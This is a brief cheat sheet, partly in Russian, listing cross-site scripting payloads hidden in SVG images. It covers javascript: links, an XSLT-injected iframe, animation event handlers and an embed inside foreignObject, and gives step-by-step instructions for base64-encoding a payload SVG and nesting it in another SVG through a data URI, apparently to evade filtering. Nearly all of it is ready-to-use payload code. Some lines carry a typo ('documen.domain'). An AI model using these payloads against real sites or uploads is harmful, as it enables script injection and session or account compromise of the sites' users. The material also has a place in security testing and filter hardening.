#XSS in SVG small cheatlist

##xlink href

```
<svg xmlns="http://www.w3.org/2000/svg"
xmlns:xlink="http://www.w3.org/1999/xlink"
width="100" height="100">
<a xlink:href="javascript:alert(documen.domain)">
<rect x="0" y="0" width="100" height="100" />
</a>
</svg>
```

##iframe inside SVG
```
<?xml version="1.0"?>
<?xml-stylesheet type="text/xml" href="#stylesheet"?>
<!DOCTYPE doc [ <!ATTLIST xsl:stylesheet id ID #REQUIRED>]>
<svg xmlns="http://www.w3.org/2000/svg">
  <xsl:stylesheet id="stylesheet" version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/">
      <iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert(1)"></iframe>
    </xsl:template>
  </xsl:stylesheet>
  <circle fill="red" r="40"></circle>
</svg>
```

##set attribute
```
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<defs>
<circle r="0" cx="0" cy="0" style="fill: #F00">
<set attributeName="fill" attributeType="CSS" onbegin='alert(document.domain)'
onend='alert("onend")' to="#00F" begin="0s" dur="999s" />
</circle>
</defs>
</svg>
```

##embed tag

```
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<foreignObject width="100" height="50" requiredExtensions="http://www.w3.org/1999/xhtml">
<embed xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert(location)" />
</foreignObject>
</svg>
```

##Закатывание svg в svg с помощью data uri

Используя xlink и data uri можно упаковывать svg (и нетолько их) внутрь других svg

Конструктция будет выглядеть примерно таки оброазром:

```
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<use xlink:href="data:application/xml;base64 ,
<BASE64>#<OBJECT_ID>"/>
</svg>
```



###Пример как упаковать svg c XSS в xlink:href

1 Добавляем к нашей svg свой id:

```
<svg id="test" xmlns="http://www.w3.org/2000/svg"
xmlns:xlink="http://www.w3.org/1999/xlink"
width="100" height="100">
<a xlink:href="javascript:alert(documen.domain)">
<rect x="0" y="0" width="100" height="100" />
</a>
</svg>
```
2 Энкодим в base64

```
PHN2ZyBpZD0idGVzdCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIgp4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayIKd2lkdGg9IjEwMCIgaGVpZ2h0PSIxMDAiPgo8YSB4bGluazpocmVmPSJqYXZhc2NyaXB0OmFsZXJ0KGRvY3VtZW4uZG9tYWluKSI+CjxyZWN0IHg9IjAiIHk9IjAiIHdpZHRoPSIxMDAiIGhlaWdodD0iMTAwIiAvPgo8L2E+Cjwvc3ZnPg==
``` 

3 Вставляем в скелет из начала статейки

```
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<use xlink:href="data:application/xml;base64 ,
PHN2ZyBpZD0idGVzdCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIgp4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayIKd2lkdGg9IjEwMCIgaGVpZ2h0PSIxMDAiPgo8YSB4bGluazpocmVmPSJqYXZhc2NyaXB0OmFsZXJ0KGRvY3VtZW4uZG9tYWluKSI+CjxyZWN0IHg9IjAiIHk9IjAiIHdpZHRoPSIxMDAiIGhlaWdodD0iMTAwIiAvPgo8L2E+Cjwvc3ZnPg==#test"/>
</svg>
```


###Пример как упаковать svg c XSS в set attribute

1 Докидываем кнашей фигурке id и вставляем ссылку на неё

```
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<defs>
<circle id="test" r="0" cx="0" cy="0" style="fill: #F00">
<set attributeName="fill" attributeType="CSS" onbegin='alert(document.domain)'
onend='alert("onend")' to="#00F" begin="0s" dur="999s" />
</circle>
</defs>
<use xlink:href="#test"/>
</svg>
```

2 Энкодим в base64

```
PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIj4KPGRlZnM+CjxjaXJjbGUgaWQ9InRlc3QiIHI9IjAiIGN4PSIwIiBjeT0iMCIgc3R5bGU9ImZpbGw6ICNGMDAiPgo8c2V0IGF0dHJpYnV0ZU5hbWU9ImZpbGwiIGF0dHJpYnV0ZVR5cGU9IkNTUyIgb25iZWdpbj0nYWxlcnQoZG9jdW1lbnQuZG9tYWluKScKb25lbmQ9J2FsZXJ0KCJvbmVuZCIpJyB0bz0iIzAwRiIgYmVnaW49IjBzIiBkdXI9Ijk5OXMiIC8+CjwvY2lyY2xlPgo8L2RlZnM+Cjx1c2UgeGxpbms6aHJlZj0iI3Rlc3QiLz4KPC9zdmc+
```

3 Вставляем в скелет из начала статейки

```
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<use xlink:href="data:application/xml;base64 ,
PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIj4KPGRlZnM+CjxjaXJjbGUgaWQ9InRlc3QiIHI9IjAiIGN4PSIwIiBjeT0iMCIgc3R5bGU9ImZpbGw6ICNGMDAiPgo8c2V0IGF0dHJpYnV0ZU5hbWU9ImZpbGwiIGF0dHJpYnV0ZVR5cGU9IkNTUyIgb25iZWdpbj0nYWxlcnQoZG9jdW1lbnQuZG9tYWluKScKb25lbmQ9J2FsZXJ0KCJvbmVuZCIpJyB0bz0iIzAwRiIgYmVnaW49IjBzIiBkdXI9Ijk5OXMiIC8+CjwvY2lyY2xlPgo8L2RlZnM+Cjx1c2UgeGxpbms6aHJlZj0iI3Rlc3QiLz4KPC9zdmc+#test"/>
</svg>
```
